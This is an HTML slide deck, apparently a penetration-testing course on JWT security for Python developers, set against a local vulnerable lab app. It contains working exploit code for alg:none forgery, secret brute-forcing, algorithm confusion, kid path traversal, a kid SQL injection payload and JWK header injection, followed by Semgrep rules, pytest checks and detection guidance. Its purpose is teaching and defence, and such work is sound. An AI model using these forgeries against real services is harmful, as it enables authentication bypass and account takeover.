<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>JWT Security Testing for Python Developers - Verifhai Training</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
<style>
:root { --r-heading-color: #f0883e; --r-link-color: #f0883e; }
.reveal { font-size: 28px; }
.reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
.reveal h1 { font-size: 2em; }
.reveal h2 { font-size: 1.5em; color: #f0883e; }
.reveal h3 { font-size: 1.2em; color: #d29922; }
.reveal pre { width: 100%; font-size: 0.55em; }
.reveal pre code { max-height: 500px; padding: 15px; }
.reveal .small-code pre { font-size: 0.48em; }
.exploit { color: #f85149; font-weight: bold; }
.secure { color: #3fb950; font-weight: bold; }
.warn { color: #d29922; font-weight: bold; }
.recon { color: #58a6ff; font-weight: bold; }
.highlight-box { background: rgba(240,136,62,0.15); border-left: 4px solid #f0883e; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.danger-box { background: rgba(248,81,73,0.15); border-left: 4px solid #f85149; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.success-box { background: rgba(63,185,80,0.15); border-left: 4px solid #3fb950; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
.auth-box { background: rgba(210,153,34,0.15); border-left: 4px solid #d29922; padding: 15px 20px; margin: 15px 0; text-align: left; border-radius: 4px; }
table { margin: 0 auto; border-collapse: collapse; font-size: 0.8em; }
th, td { border: 1px solid #444; padding: 8px 14px; text-align: left; }
th { background: rgba(240,136,62,0.2); color: #f0883e; }
.episode-card { background: linear-gradient(135deg, #1a0e00, #0d1117); border: 1px solid #30363d; border-radius: 12px; padding: 40px; }
.badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 0.7em; margin: 0 4px; }
.badge-l1 { background: #238636; }
.badge-l2 { background: #9e6a03; }
.badge-l3 { background: #da3633; }
</style>
</head>
<body>
<div class="reveal">
<div class="slides">

<!-- ============================================================ -->
<!-- TITLE SLIDE -->
<!-- ============================================================ -->
<section>
<h1>JWT Security Testing</h1>
<h3>Penetration Testing for Python Developers</h3>
<p style="margin-top:40px;color:#8b949e;">10 Episodes &bull; 100 Minutes &bull; L1-L3</p>
<p style="color:#f0883e;">Verifhai &bull; HAIAMM Education & Guidance</p>
<div class="auth-box" style="font-size:0.7em;margin-top:20px;">
All exercises target intentionally vulnerable applications.<br>
Never use these techniques without explicit written authorization.
</div>
<aside class="notes">Welcome to the JWT Security Testing series. This offensive companion to the defensive JWT lab teaches you to find and exploit JWT vulnerabilities during authorized security assessments.</aside>
</section>

<!-- ============================================================ -->
<!-- SERIES OVERVIEW -->
<!-- ============================================================ -->
<section>
<h2>Series Overview</h2>
<table>
<tr><th>Episode</th><th>Topic</th><th>Level</th></tr>
<tr><td>E01</td><td>JWT Reconnaissance &amp; Token Analysis</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E02</td><td>The alg:none Exploit</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E03</td><td>Brute-Forcing JWT Secrets</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E04</td><td>Exploiting Claims Validation Gaps</td><td><span class="badge badge-l1">L1</span></td></tr>
<tr><td>E05</td><td>Algorithm Confusion Attack</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E06</td><td>kid Injection &amp; JWK/JKU Attacks</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E07</td><td>Token Theft, Replay &amp; Chaining</td><td><span class="badge badge-l2">L2</span></td></tr>
<tr><td>E08</td><td>Building a JWT Testing Framework</td><td><span class="badge badge-l3">L3</span></td></tr>
<tr><td>E09</td><td>CI/CD Integration &amp; Semgrep Rules</td><td><span class="badge badge-l3">L3</span></td></tr>
<tr><td>E10</td><td>Professional Reporting &amp; Blue Team</td><td><span class="badge badge-l3">L3</span></td></tr>
</table>
</section>

<!-- ============================================================ -->
<!-- E01: JWT RECONNAISSANCE -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 01</h2>
<h1>JWT Reconnaissance &amp; Token Analysis</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
</div>
</section>

<section>
<h2>First Step: Capture &amp; Decode</h2>
<div class="highlight-box">JWTs are Base64URL-encoded — NOT encrypted. Anyone can read the payload.</div>
<pre><code class="python">import base64, json

token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.signature"
parts = token.split(".")
header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
print(f"Algorithm: {header['alg']}")
print(f"Claims: {json.dumps(payload, indent=2)}")</code></pre>
<aside class="notes">The first rule of JWT testing: decode first, attack second. The header tells you the algorithm, the payload reveals identity claims, roles, and expiry.</aside>
</section>

<section>
<h2>Reconnaissance Checklist</h2>
<table>
<tr><th>Check</th><th>What It Tells You</th></tr>
<tr><td><code>alg</code> field</td><td>HS256 → brute-force, RS256 → algorithm confusion</td></tr>
<tr><td><code>kid</code> header</td><td>Possible path traversal or SQL injection</td></tr>
<tr><td><code>exp</code> claim</td><td>Missing or far-future → replay window</td></tr>
<tr><td><code>aud</code> claim</td><td>Missing → cross-service token reuse</td></tr>
<tr><td><code>jwk/jku</code> header</td><td>Key injection possible</td></tr>
</table>
<aside class="notes">This checklist maps each JWT element to its corresponding attack vector. Run through this for every token you capture.</aside>
</section>

<section>
<h2>Targeting the Vulnerable App</h2>
<pre><code class="python">import requests

# Step 1: Login and capture the token
resp = requests.post("http://127.0.0.1:5000/login",
    json={"username": "alice", "password": "alice-pass"})
token = resp.json()["token"]
print(f"Captured token: {token}")

# Step 2: Analyze it
# Algorithm? Claims? Expiry? kid?</code></pre>
<div class="danger-box">Every field you decode is intelligence for the next attack.</div>
<aside class="notes">We start by logging in to capture a real token, then decode and analyze it to plan our attack strategy.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E02: ALG:NONE EXPLOIT -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 02</h2>
<h1>The alg:none Exploit</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
</div>
</section>

<section>
<h2>The Attack: Zero Signature Forgery</h2>
<div class="danger-box">If the server accepts <code>alg: none</code>, any token can be forged without a secret.</div>
<pre><code class="python">import jwt

# Forge an admin token — no secret needed
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    key=None,
    algorithm="none"
)
print(f"Forged token: {forged}")
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.</code></pre>
<aside class="notes">The alg:none attack is the simplest JWT vulnerability — change the algorithm to none, forge any claims, empty signature. If the server accepts it, game over.</aside>
</section>

<section>
<h2>Exploitation in Action</h2>
<pre><code class="python">import requests, jwt

# Forge admin token
forged = jwt.encode(
    {"sub": "bob", "role": "admin", "email": "bob@example.com"},
    key=None, algorithm="none")

# Submit to vulnerable endpoint
resp = requests.get("http://127.0.0.1:5000/api/profile",
    headers={"Authorization": f"Bearer {forged}"})

print(resp.json())
# {"message": "Welcome, bob", "role": "admin"}</code></pre>
<div class="success-box"><span class="exploit">RESULT:</span> Admin access without knowing any secret</div>
<aside class="notes">We submit the forged token to the profile endpoint, which accepts alg:none. The response confirms we're authenticated as bob with admin role.</aside>
</section>

<section>
<h2>Case Variation Bypass</h2>
<pre><code class="python"># Some servers filter "none" but not case variations
for alg in ["none", "None", "NONE", "nOnE", "noNe"]:
    header = base64url_encode(json.dumps({"alg": alg, "typ": "JWT"}))
    token = f"{header}.{payload}."
    resp = requests.get(url, headers={"Authorization": f"Bearer {token}"})
    if resp.status_code == 200:
        print(f"Bypass with alg={alg}!")</code></pre>
<aside class="notes">If a simple none doesn't work, try case variations. Many filters only check for lowercase none.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E03: BRUTE-FORCING SECRETS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 03</h2>
<h1>Brute-Forcing JWT Secrets</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 9 minutes</p>
</div>
</section>

<section>
<h2>Why Offline Brute-Force Works</h2>
<div class="highlight-box">
<strong>Online attacks:</strong> Rate limits, account lockouts, detection<br>
<strong>JWT brute-force:</strong> Entirely offline — no server contact needed
</div>
<p>With one captured token, compute <code>HMAC(header.payload, candidate)</code> and compare to the signature. Zero rate limiting.</p>
<aside class="notes">This is what makes weak JWT secrets so dangerous — the attacker only needs ONE token to crack the secret offline.</aside>
</section>

<section>
<h2>Building the Brute-Forcer</h2>
<div class="small-code">
<pre><code class="python">import hmac, hashlib, base64

def crack_jwt(token, wordlist):
    header_payload = token.rsplit(".", 1)[0].encode()
    signature = token.rsplit(".", 1)[1]

    for word in wordlist:
        candidate_sig = base64.urlsafe_b64encode(
            hmac.new(word.encode(), header_payload, hashlib.sha256).digest()
        ).rstrip(b"=").decode()

        if candidate_sig == signature:
            return word
    return None

wordlist = ["secret", "password", "password123", "changeme",
            "jwt_secret", "my-secret-key", "default"]
result = crack_jwt(captured_token, wordlist)
print(f"Secret found: {result}")  # "password123"</code></pre>
</div>
<aside class="notes">Seven lines of code. The weak secret password123 is cracked instantly because it's in every wordlist.</aside>
</section>

<section>
<h2>Common Weak Secrets</h2>
<table>
<tr><th>Source</th><th>Default Secret</th></tr>
<tr><td>jwt.io demo</td><td><code>secret</code></td></tr>
<tr><td>Tutorial copypaste</td><td><code>my-secret-key</code></td></tr>
<tr><td>Framework default</td><td><code>changeme</code></td></tr>
<tr><td>Developer shortcut</td><td><code>password123</code></td></tr>
<tr><td>Env var fallback</td><td><code>default-secret</code></td></tr>
</table>
<div class="danger-box">These appear in the first 10 entries of any wordlist.</div>
<aside class="notes">These aren't theoretical. These are the actual secrets found in production JWT implementations during real penetration tests.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E04: CLAIMS VALIDATION GAPS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 04</h2>
<h1>Exploiting Claims Validation Gaps</h1>
<p><span class="badge badge-l1">Level 1</span> &bull; 8 minutes</p>
</div>
</section>

<section>
<h2>Expired Token Replay</h2>
<pre><code class="python">import jwt, time

# Create a token that expired an hour ago
expired_token = jwt.encode(
    {"sub": "alice", "role": "admin", "exp": int(time.time()) - 3600},
    "password123", algorithm="HS256")

# Submit to endpoint with verify_exp=False
resp = requests.get("http://127.0.0.1:5000/api/admin",
    headers={"Authorization": f"Bearer {expired_token}"})

print(resp.status_code)  # 200 — expired token accepted!</code></pre>
<aside class="notes">If the server doesn't check expiry, stolen tokens from logs and backups work forever.</aside>
</section>

<section>
<h2>Cross-Audience Token Reuse</h2>
<pre><code class="python"># Token was minted for "billing-api"
billing_token = jwt.encode(
    {"sub": "alice", "role": "user", "aud": "billing-api"},
    "password123", algorithm="HS256")

# Use it against the data API — no audience validation
resp = requests.get("http://127.0.0.1:5000/api/data",
    headers={"Authorization": f"Bearer {billing_token}"})

print(resp.json())  # Access granted — aud not checked</code></pre>
<div class="danger-box">Missing <code>aud</code> validation = tokens work across all services</div>
<aside class="notes">This billing token should only work on the billing API. But without audience validation, it gives access everywhere.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E05: ALGORITHM CONFUSION -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 05</h2>
<h1>Algorithm Confusion Attack</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 14 minutes</p>
</div>
</section>

<section>
<h2>The Theory</h2>
<div class="highlight-box">
Server expects: <code>RS256</code> (asymmetric — private key signs, public key verifies)<br>
Attacker sends: <code>HS256</code> (symmetric — same key signs AND verifies)
</div>
<p>If the server accepts both algorithms, the <strong>public key</strong> becomes the HMAC secret.</p>
<p>Public key is... <span class="exploit">public.</span></p>
<aside class="notes">This is elegant: the public key is meant to be public. The vulnerability is that the server trusts the algorithm field in the token header.</aside>
</section>

<section>
<h2>Step 1: Obtain the Public Key</h2>
<pre><code class="python">import requests

# JWKS endpoint exposes the public key
jwks = requests.get("http://127.0.0.1:5000/.well-known/jwks.json").json()
print(json.dumps(jwks, indent=2))
# {"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", ...}]}</code></pre>
<aside class="notes">Step one: get the public key. It's available at the standard JWKS endpoint. This is by design — the key is supposed to be public.</aside>
</section>

<section>
<h2>Step 2: Forge with HS256</h2>
<div class="small-code">
<pre><code class="python">import jwt, requests
from jwt.algorithms import RSAAlgorithm

# Get the public key in PEM format
jwks = requests.get("http://127.0.0.1:5000/.well-known/jwks.json").json()
pub_key = RSAAlgorithm.from_jwk(json.dumps(jwks["keys"][0]))
pub_pem = pub_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo)

# Sign with HS256 using the public key as the HMAC secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pub_pem, algorithm="HS256")

resp = requests.get("http://127.0.0.1:5000/api/rs256/data",
    headers={"Authorization": f"Bearer {forged}"})
print(resp.json())  # Access granted!</code></pre>
</div>
<div class="success-box"><span class="exploit">RESULT:</span> RS256 endpoint bypassed with HS256 + public key</div>
<aside class="notes">The server's decode call uses the public key for both RS256 and HS256 verification. We signed with HS256 using that same public key — it verifies successfully.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E06: KID INJECTION & JWK ATTACKS -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 06</h2>
<h1>kid Injection &amp; JWK/JKU Attacks</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 12 minutes</p>
</div>
</section>

<section>
<h2>kid Path Traversal</h2>
<pre><code class="python">import jwt

# kid controls the file path for the verification key
# Use /dev/null → empty file → empty string as key
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    key="",  # empty string = content of /dev/null
    algorithm="HS256",
    headers={"kid": "../../dev/null"})

resp = requests.get("http://127.0.0.1:5000/api/kid/data",
    headers={"Authorization": f"Bearer {forged}"})
print(resp.json())  # Traversal successful</code></pre>
<aside class="notes">The kid header tells the server which key file to load. By traversing to /dev/null, we force an empty key — and sign our token with that same empty string.</aside>
</section>

<section>
<h2>kid SQL Injection</h2>
<pre><code class="python"># kid is used in SQL: SELECT secret FROM keys WHERE kid = '{kid}'
# Inject to return our own secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    key="attacker-secret",
    algorithm="HS256",
    headers={"kid": "' UNION SELECT 'attacker-secret' -- "})

resp = requests.get("http://127.0.0.1:5000/api/kid-db/data",
    headers={"Authorization": f"Bearer {forged}"})
print(resp.json())  # SQL injection → controlled key</code></pre>
<aside class="notes">SQL injection in the kid field lets us control what secret the server uses for verification. We pick a secret we know and sign with it.</aside>
</section>

<section>
<h2>JWK Header Injection</h2>
<div class="small-code">
<pre><code class="python">from cryptography.hazmat.primitives.asymmetric import rsa

# Generate attacker's key pair
attacker_key = rsa.generate_private_key(65537, 2048)

# Embed public key in the token's jwk header
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    attacker_key,  # sign with our private key
    algorithm="RS256",
    headers={"jwk": json.loads(RSAAlgorithm.to_jwk(
        attacker_key.public_key()))})

# Server trusts the jwk from the token header
resp = requests.get("http://127.0.0.1:5000/api/jwk/data",
    headers={"Authorization": f"Bearer {forged}"})
print(resp.json()["jwk_source"])  # "token_header"</code></pre>
</div>
<aside class="notes">We generate our own RSA key pair, embed our public key in the token, sign with our private key. The server trusts the key from the token itself.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E07: TOKEN THEFT & CHAINING -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 07</h2>
<h1>Token Theft, Replay &amp; Chaining</h1>
<p><span class="badge badge-l2">Level 2</span> &bull; 10 minutes</p>
</div>
</section>

<section>
<h2>Token Leakage Vectors</h2>
<table>
<tr><th>Vector</th><th>Risk</th><th>Evidence</th></tr>
<tr><td>URL query param</td><td class="exploit">High</td><td>Server logs, Referer header</td></tr>
<tr><td>localStorage</td><td class="exploit">High</td><td>Accessible via XSS</td></tr>
<tr><td>Non-HttpOnly cookie</td><td class="warn">Medium</td><td>Readable by JavaScript</td></tr>
<tr><td>Authorization header</td><td class="secure">Low</td><td>Not logged by default</td></tr>
</table>
<aside class="notes">Where the token is stored determines how easy it is to steal. URL parameters are the worst — they leak everywhere.</aside>
</section>

<section>
<h2>Missing Revocation After Password Change</h2>
<pre><code class="python"># 1. Login and get token
token = login("alice", "alice-pass")

# 2. User changes password
requests.post("http://127.0.0.1:5000/api/change-password",
    headers={"Authorization": f"Bearer {token}"},
    json={"new_password": "new-secure-pass"})

# 3. Old token STILL WORKS
resp = requests.get("http://127.0.0.1:5000/api/profile",
    headers={"Authorization": f"Bearer {token}"})
print(resp.status_code)  # 200 — not revoked!</code></pre>
<div class="danger-box">Password changed, but old tokens live on.</div>
<aside class="notes">Even after password change, old tokens remain valid. Combined with token theft from URL logs, this means stolen tokens work forever.</aside>
</section>

<section>
<h2>Attack Chain Example</h2>
<div class="highlight-box">
<strong>Step 1:</strong> Brute-force weak secret → <code>password123</code><br>
<strong>Step 2:</strong> Forge admin token with known secret<br>
<strong>Step 3:</strong> Access admin panel → extract sensitive data<br>
<strong>Step 4:</strong> kid injection for persistent backdoor access
</div>
<aside class="notes">Real penetration tests chain vulnerabilities. One weak secret leads to admin access, which leads to persistent compromise through a second vulnerability.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E08: JWT TESTING FRAMEWORK -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 08</h2>
<h1>Building a JWT Testing Framework</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 12 minutes</p>
</div>
</section>

<section>
<h2>Framework Architecture</h2>
<div class="highlight-box">
<strong>Token Acquisition</strong> → <strong>Attack Modules</strong> → <strong>Results Collector</strong>
</div>
<table>
<tr><th>Module</th><th>Tests</th></tr>
<tr><td><code>alg_none</code></td><td>None + case variations</td></tr>
<tr><td><code>weak_secret</code></td><td>Wordlist brute-force</td></tr>
<tr><td><code>algo_confusion</code></td><td>RS256 → HS256</td></tr>
<tr><td><code>kid_injection</code></td><td>Path traversal, SQLi</td></tr>
<tr><td><code>jwk_injection</code></td><td>Embedded attacker key</td></tr>
<tr><td><code>claims_bypass</code></td><td>exp, aud, iss validation</td></tr>
</table>
<aside class="notes">A modular framework lets you run all JWT tests against any target with a single command.</aside>
</section>

<section>
<h2>Plugin Pattern</h2>
<pre><code class="python">class JWTAttackModule:
    name = "base"
    severity = "Unknown"

    def test(self, token, target_url, **kwargs):
        raise NotImplementedError

    def report(self):
        return {"module": self.name, "findings": self.findings}

class AlgNoneModule(JWTAttackModule):
    name = "alg_none"
    severity = "Critical"

    def test(self, token, target_url, **kwargs):
        for alg in ["none", "None", "NONE", "nOnE"]:
            forged = jwt.encode({"sub": "admin"}, None, algorithm=alg)
            resp = requests.get(target_url,
                headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200:
                self.findings.append({"alg": alg, "status": "VULNERABLE"})</code></pre>
<aside class="notes">Each attack module inherits from a base class and implements the test method. This lets you add new attacks without changing existing code.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E09: CI/CD INTEGRATION -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 09</h2>
<h1>CI/CD Integration &amp; Semgrep Rules</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 9 minutes</p>
</div>
</section>

<section>
<h2>Semgrep Rule: Detect alg:none</h2>
<pre><code class="yaml">rules:
  - id: jwt-algorithms-include-none
    patterns:
      - pattern: |
          jwt.decode($TOKEN, $KEY, algorithms=[..., "none", ...])
    message: "JWT algorithms list includes 'none' — allows unsigned tokens"
    severity: ERROR
    languages: [python]</code></pre>
<aside class="notes">This Semgrep rule catches any JWT decode call that includes none in the algorithms list, regardless of position.</aside>
</section>

<section>
<h2>pytest Security Tests</h2>
<pre><code class="python">def test_rejects_alg_none():
    """JWT endpoint must reject alg:none tokens."""
    forged = jwt.encode({"sub": "admin"}, None, algorithm="none")
    resp = client.get("/api/profile",
        headers={"Authorization": f"Bearer {forged}"})
    assert resp.status_code == 401

def test_rejects_expired_tokens():
    """JWT endpoint must reject expired tokens."""
    expired = jwt.encode(
        {"sub": "alice", "exp": int(time.time()) - 3600},
        SECRET, algorithm="HS256")
    resp = client.get("/api/admin",
        headers={"Authorization": f"Bearer {expired}"})
    assert resp.status_code == 401</code></pre>
<aside class="notes">These pytest tests run in CI/CD and fail if JWT security controls are missing. Catch vulnerabilities before they reach production.</aside>
</section>
</section>

<!-- ============================================================ -->
<!-- E10: REPORTING & BLUE TEAM -->
<!-- ============================================================ -->
<section>
<section>
<div class="episode-card">
<h2>Episode 10</h2>
<h1>Professional Reporting &amp; Blue Team</h1>
<p><span class="badge badge-l3">Level 3</span> &bull; 10 minutes</p>
</div>
</section>

<section>
<h2>Finding Template</h2>
<table>
<tr><th>Field</th><th>Example</th></tr>
<tr><td><strong>Title</strong></td><td>JWT Algorithm None Accepted</td></tr>
<tr><td><strong>Severity</strong></td><td class="exploit">Critical (CVSS 9.8)</td></tr>
<tr><td><strong>Description</strong></td><td>The /api/profile endpoint accepts JWTs with alg:none</td></tr>
<tr><td><strong>Impact</strong></td><td>Complete authentication bypass — any identity forgeable</td></tr>
<tr><td><strong>Remediation</strong></td><td>Remove "none" from algorithms allowlist</td></tr>
<tr><td><strong>Evidence</strong></td><td>Forged token + 200 response screenshot</td></tr>
</table>
<aside class="notes">Every finding needs these fields. The evidence is what separates a professional report from a vulnerability scan dump.</aside>
</section>

<section>
<h2>Blue Team Detection</h2>
<table>
<tr><th>Attack</th><th>Log Indicator</th></tr>
<tr><td>alg:none</td><td>Decoded header shows <code>"alg":"none"</code></td></tr>
<tr><td>Algorithm confusion</td><td>HS256 token on RS256 endpoint</td></tr>
<tr><td>kid traversal</td><td><code>kid</code> contains <code>../</code></td></tr>
<tr><td>Weak secret</td><td>N/A (offline attack, no log signal)</td></tr>
<tr><td>Token replay</td><td>Same token from different IPs/sessions</td></tr>
</table>
<div class="success-box">Understanding detection helps you write better recommendations.</div>
<aside class="notes">The best pentest reports include detection guidance. Tell defenders what to monitor so they can catch these attacks in the future.</aside>
</section>

<section>
<h2>Series Complete</h2>
<div class="highlight-box">
<strong>L1:</strong> Reconnaissance, alg:none, brute-force, claims bypass<br>
<strong>L2:</strong> Algorithm confusion, kid injection, JWK attacks, chaining<br>
<strong>L3:</strong> Testing frameworks, CI/CD integration, professional reporting
</div>
<p style="margin-top:20px;">
<span class="badge badge-l1">Crawl</span>
<span class="badge badge-l2">Walk</span>
<span class="badge badge-l3">Run</span>
</p>
<div class="auth-box" style="font-size:0.8em;margin-top:20px;">
Always test with authorization. Never use these techniques without explicit written permission.
</div>
<aside class="notes">You now have the skills to conduct a professional JWT security assessment — from reconnaissance through reporting. Always test with authorization.</aside>
</section>
</section>

</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
<script>
Reveal.initialize({
  hash: true,
  slideNumber: true,
  plugins: [RevealHighlight, RevealNotes]
});
</script>
</body>
</html>
